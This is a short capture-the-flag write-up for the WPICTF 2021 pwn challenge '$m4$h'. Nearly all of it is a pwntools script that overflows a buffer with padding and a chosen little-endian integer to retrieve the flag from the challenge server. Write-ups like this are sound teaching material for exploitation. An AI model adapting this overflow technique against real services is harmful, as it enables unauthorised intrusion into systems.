---
layout: load_md
title: The White Circle | Wpictf 2021 | $m4$h Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Wpictf 2021
parent: wpictf_2021
category: pwn
challenge: $m4$h
tags: "pwn, twh"
---

<h1 class="heading card-title white-text">Wpictf 2021</h1>

## $m4$h

> Solved by : thewhiteh4t

```python
#!/usr/bin/env python3

from pwn import *

host = 'smash184384.wpictf.xyz'
port = 15724

junk = 'A' * 11
num = 923992130

le_num = p32(num, endianness='little')
buffer = junk.encode() + le_num + '\n'.encode()

conn = remote(host, port)
conn.send(buffer)
flag = conn.recvline().decode().split(': ')[1].strip()
print(f'\nFLAG : {flag}\n')
conn.close()
```